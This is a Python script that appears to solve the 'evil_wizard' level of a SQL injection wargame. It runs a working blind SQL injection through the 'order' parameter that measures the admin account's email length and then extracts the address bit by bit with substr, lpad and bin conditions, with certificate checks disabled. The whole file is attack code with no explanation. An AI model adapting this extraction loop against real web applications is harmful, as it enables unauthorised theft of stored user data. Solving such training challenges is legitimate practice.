import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php'
headers = {'Cookie': ''}

payload = "?order=id='admin'"
res = sess.get(url=URL + payload, headers=headers, verify=False)
re1 = res.text.find("admin")

E_Length = 0
Email = ''
for i in range(1, 50):
    payload2 = "?order=id='admin' and length(email)="+str(i)+",id='rubiya'"
    res2 = sess.get(url=URL + payload2, headers=headers, verify=False)
    re2 = res2.text.find("admin")
    if re1 == re2:
        E_Length = i
        break
    else:
        pass
print('E_Length = {}'.format(i))

for i in range(1, E_Length+1):
    bit=''
    for j in range(1, 9):
        payload3 = "?order=id='admin' and substr(lpad(bin(ord(substr(email,{},1))),8,0),{},1)=1,id='rubiya'".format(i,j)
        res3 = sess.get(url=URL + payload3, headers=headers, verify=False)
        re3 = res3.text.find("admin")
        if re1 == re3:
            bit += '1'
        else:
            bit += '0'

    Email += chr((int(bit, 2)))
    print('Email(count %02d) : %s (bit : %s)' % (i, chr(int(bit, 2)), bit))
print('Email= {}'.format(Email))



